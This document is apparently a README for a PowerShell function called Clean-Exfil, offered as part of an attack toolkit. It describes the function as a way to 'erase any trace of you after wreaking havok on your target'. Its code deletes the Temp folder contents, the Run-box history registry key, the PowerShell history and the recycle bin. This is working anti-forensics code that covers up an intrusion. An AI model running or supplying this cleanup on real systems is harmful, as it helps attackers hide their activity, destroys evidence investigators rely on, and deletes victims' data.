## Description

This function is to erase any trace of you after wreaking havok on your target 

## The Function

### [Clean-Exfil] 

You will Delete contents of Temp folder, Delete run box history, Delete powershell history, and Deletes contents of recycle bin

```PowerShell
function Clean-Exfil { 

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}
```